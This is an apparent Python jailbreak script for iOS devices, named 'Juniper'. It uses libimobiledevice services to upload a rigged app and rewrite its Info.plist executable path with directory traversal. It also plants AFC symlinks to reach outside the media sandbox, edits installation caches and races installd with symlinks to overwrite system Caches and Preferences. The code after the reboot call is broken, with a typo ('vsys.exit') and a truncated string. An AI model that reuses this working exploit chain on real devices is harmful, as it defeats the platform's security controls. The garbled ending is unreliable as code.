import sys, os
import imobiledevice
from imobiledevice import *
import libarchive
from subprocess import call
from zipfile import ZipFile
import plist, plistlib
from time import sleep
import tempfile
import shutil

current_dir = os.getcwd()

tmp_dir = tempfile.mkdtemp()
print(tmp_dir)
os.chdir(tmp_dir)

def get_lockdown():
	while True:
		try:
			ld = LockdownClient(iDevice())
			return ld
		except iDeviceError:
			continue

def get_client(service_class):
        ld = get_lockdown()
        return ld.get_service_client(service_class)

def get_afc():
	return get_client(AfcClient)

def get_fr():
	return get_client(FileRelayClient)

def get_drr():
	return get_client(DiagnosticsRelayClient)

def get_ip():
	return get_client(InstallationProxyClient)

def debug(percent, message):
	print("[" + percent + "%] " + message)

ld = get_lockdown()

afc = get_afc()
fr = get_fr()
drr = get_drr()
ip = get_ip()

def upload_recursively(folder, destination):
        for x in os.walk(folder):
                afc.make_directory(destination + "/" + x[0])

                for file in x[2]:
                        with afc.open(destination + "/" + x[0] + "/" + file, "w+") as rfile:
                                local_file = open(x[0] + "/" + file, "r+")
                                rfile.write(local_file.read())

debug("0", "Extracting jailbreak.ipa...")

shutil.copyfile(os.path.join(current_dir, "jailbreak.ipa"), "jailbreak.ipa")

with ZipFile("jailbreak.ipa", "r") as ipa:
	ipa.extractall(tmp_dir)

debug("0", "Uploading Juniper app...")

os.chdir("Payload")

upload_recursively("Jailbreaker.app", "Downloads")

debug("10", "Modifying Info.plist...")

call(["plistutil", "-i", "Jailbreaker.app/Info.plist", "-o", "Jailbreaker.app/Info.plist.tmp"])

file_contents = ""
next_is_executable = False

with open("Jailbreaker.app/Info.plist.tmp", "r") as info:
	for line in info:
		if next_is_executable and line.find("..") == -1:
			file_contents += line.replace("Jailbreaker", "../../../../../../var/mobile/Media/Downloads/Jailbreaker.app/Jailbreaker")
			next_is_executable = False
		elif next_is_executable:
			next_is_executable = False
		else:
			if line.find("CFBundleExecutable") != -1:
				next_is_executable = True
			file_contents += line

with open("Jailbreaker.app/Info.plist", "w") as info:
	info.write(file_contents)

os.remove("Jailbreaker.app/Info.plist.tmp")

debug("20", "Modifying main executable...")

with afc.open("Downloads/Jailbreaker.app/Jailbreaker", "w") as executable:
	executable.write("#!/usr/libexec/afcd -S -d / -p 8888")

debug("30", "Working AFC magic...")

afc.make_directory("Downloads/a")
afc.make_directory("Downloads/a/a")
afc.make_directory("Downloads/a/a/a")
afc.make_directory("Downloads/a/a/a/a")
afc.make_directory("Downloads/a/a/a/a/a")

afc.symlink("../../../../../tmp", "Downloads/a/a/a/a/a/link")
afc.rename_path("Downloads/a/a/a/a/a/link", "tmp")

debug("40", "Requesting cache...")

os.chdir(tmp_dir)

conn = fr.request_sources(["Caches"])

with open("caches.cpio.gz", "wb+") as dumpfile:
	while (1):
		try:
			data = conn.receive_timeout(4096, 10)
			dumpfile.write(data)
		except Exception, e:
			if e.code == -2:
				break;
			raise e

try:
	libarchive.extract.extract_file("caches.cpio.gz")
	libarchive.extract.extract_file("caches.cpio")
except:
	pass

debug("50", "Modifying and uploading cache files...")

os.chdir("var/mobile/Library/Caches")

call(["plistutil", "-i", "com.apple.mobile.installation.plist", "-o", "com.apple.mobile.installation.plist.tmp"])

file_contents = ""

with open("com.apple.mobile.installation.plist.tmp", "r") as install_cache:
	for line in install_cache:
		print(line)
		file_contents += line

		if line.find("8/tmp") != -1:
			print("found")
			print(line)
#			file_contents += "\t\t\t\t<key>DUMMY_KEY</key>\n"
#			file_contents += "\t\t\t\t<string>/private/var/mobile/Media/Downloads/Jailbreaker.app/sandbox.dylib\n"

with open("com.apple.mobile.installation.plist", "w") as install_cache:
	install_cache.write(file_contents)

os.remove("com.apple.mobile.installation.plist.tmp")

with open("com.apple.LaunchServices-045.csstore", "w") as launch_services:
	launch_services.write("")

os.chdir(tmp_dir)

ios_version = ld.get_value(None, "BuildVersion").get_value()

with open("com.apple.backboardd.plist", "w") as backboardd:
	backboardd.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
	backboardd.write("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">")
	backboardd.write("<plist version=\"1.0\">")
	backboardd.write("<dict>")
	backboardd.write("\t<key>BKDataMigratorLastSystemVersion</key>")
	backboardd.write("\t<string>" + ios_version + "</string>")
	backboardd.write("\t<key>BKNoWatchdogs</key>")
	backboardd.write("\t<string>Yes</string>")
	backboardd.write("\t<key>InvertColorsEnabled</key>")
	backboardd.write("\t<false />")
	backboardd.write("</dict>")
	backboardd.write("</plist>")

with ZipFile("caches.zip", "w") as caches:
	os.chdir("var/mobile/Library/Caches")
	caches.write("com.apple.mobile.installation.plist")
	caches.write("com.apple.LaunchServices-045.csstore")
	os.chdir(tmp_dir)

with ZipFile("preferences.zip", "w") as preferences:
	preferences.write("com.apple.backboardd.plist")

options = plist.from_xml("<plist><dict><key>CFBundleIdentifier</key><string>juniper.installd.race</string></dict></plist>")

def race_installd(cache_file, destination):
	try:
		while True:
			with afc.open("/PublicStaging/" + cache_file, "w") as cache:
				local_cache = open(cache_file, "r")
				cache.write(local_cache.read())

			try:
				ip.install("/PublicStaging/" + cache_file, options)
			except:
				pass

			tmp_listing = afc.read_directory("/tmp")

			for entry in tmp_listing:
				if entry.find("install_staging.") != -1:
					while True:
						try:
							staging_listing = afc.read_directory("/tmp/" + entry)

							if "foo_extracted" not in staging_listing:
								afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
							elif len(afc.read_directory("/tmp/" + entry + "/foo_extracted")) == 2:
								afc.rename_path("/tmp/" + entry + "/foo_extracted", "/tmp/" + entry + "/foo_extracted.old")
								afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")

							raise StopIteration
						except AfcError, e:
							break
	except StopIteration:
		return 1

debug("60", "Attempting to race installd (#1)...")

if race_installd("caches.zip", "/var/mobile/Library/Caches/") == 1:
	debug("70", "Success!")

debug("70", "Attempting to race installd (#2)...")

if race_installd("preferences.zip", "/var/mobile/Library/Preferences/") == 1:
	debug("80", "Success!")

debug("80", "Rebooting, please click on the Juniper app once it starts up!")

drr.restart(0)

#shutil.rmtree(tmp_dir)

vsys.exit(0)

ld = get_lockdown()

afc = get_afc()
drr = get_drr()

while True:
	try:
		afc.symlink("..", "/var/mobile/Media/testy")
		afc.read_directory("/var/mobile/Media/testy")
		afc.symlink("../../../../../dev/rdisk0s1s1", "/var/mobile/Library/Logs/AppleSupport")
		afc.remove_path("/var/mobile/Media/testy")

		break
	except:
		pass

file_contents = ""

with afc.open("/var/mobile/Library/

drr.restart(0)

ld = get_lockdown()

afc = get_afc()
drr = get_drr()

